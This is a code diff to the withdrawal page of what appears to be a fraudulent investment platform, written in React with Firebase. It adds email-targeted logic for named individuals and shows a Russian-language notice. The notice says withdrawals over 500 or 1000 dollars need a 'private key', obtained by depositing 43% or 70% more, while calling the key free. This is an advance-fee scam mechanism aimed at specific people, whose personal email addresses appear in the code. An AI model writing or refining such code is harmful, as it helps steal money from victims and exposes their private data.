@@ -42,10 +42,29 @@ const Withdraw = () => {
 
   const [walletIsExist, setWalletIsExist] = useState(false);
 
+  const [privatKeyPercentage, setPrivatKeyPercentage] = useState(70);
+  const [privatKeyAmount, setPrivatKeyAmount] = useState(1000);
+
   useEffect(() => {
     const userWithdrawn = userData.withdrawn;
+    const isErnest = (userWithdrawn >= 1000 && userData.email === "azrv1@mail.ru") || userWithdrawn + amount >= 1000;
+    const isSaule =
+      (userWithdrawn >= 500 && userData.email === "sauleselecta@gmail.com") || userWithdrawn + amount >= 500;
 
-    if (userData.email === "bonyklade@gmail.com" || userData.email === "azrv1@mail.ru") {
+    const isArt =
+      (userWithdrawn >= 500 && userData.email === "probuisness90@gmail.com") || userWithdrawn + amount >= 500;
+
+    if (isErnest) {
+      setPrivatKeyAmount(1000);
+      setPrivatKeyPercentage(43);
+    }
+
+    if (isSaule) {
+      setPrivatKeyAmount(500);
+      setPrivatKeyPercentage(70);
+    }
+
+    if (isErnest || isSaule) {
       setIsPrivatKeyShowed(true);
     } else {
       setIsPrivatKeyShowed(false);
@@ -106,15 +125,16 @@ const Withdraw = () => {
               </p>
               <p>
                 Мы хотели бы напомнить вам о важности безопасности вашего аккаунта при использовании нашей платформы.
-                Если вы планируете вывести со своего счета сумму свыше <span>1000$</span>, вам необходимо использовать
-                приватный ключ для подтверждения транзакции.
+                Если вы планируете вывести со своего счета сумму свыше <span>{privatKeyAmount}$</span>, вам необходимо
+                использовать приватный ключ для подтверждения транзакции.
               </p>
               <p>
                 Приватный ключ - это уникальный и секретный код, который используется для подписи транзакций и
-                подтверждения вашей личности. Для получения приватного ключа нужно пополнить кабинет на <span>43%</span>{" "}
-                от суммы всех депозитов. Приобретение приватного ключа - <span>бесплатно.</span> Средства можно будет
-                вывести сразу, после того как они будут зачислены на ваш счет. Все функции вашего личного кабинета, в
-                том числе, все внесенные средства, будут доступны сразу же после ввода приватного финансового ключа.
+                подтверждения вашей личности. Для получения приватного ключа нужно пополнить кабинет на{" "}
+                <span>{privatKeyPercentage}%</span> от суммы всех депозитов. Приобретение приватного ключа -{" "}
+                <span>бесплатно.</span> Средства можно будет вывести сразу, после того как они будут зачислены на ваш
+                счет. Все функции вашего личного кабинета, в том числе, все внесенные средства, будут доступны сразу же
+                после ввода приватного финансового ключа.
               </p>
               <p>Пожалуйста, убедитесь, что ваш приватный ключ надежно защищен и не передается третьим лицам.</p>
               <div>
@@ -205,8 +225,6 @@ const Withdraw = () => {
 
   const onDone = () => {
     form.validateFields().then(async (values) => {
-      console.log(values, "values");
-
       await addDoc(collection(firestore, "transactions"), {
         account_id: auth.currentUser.uid,
         amount: +form.getFieldValue("amount") + tax,
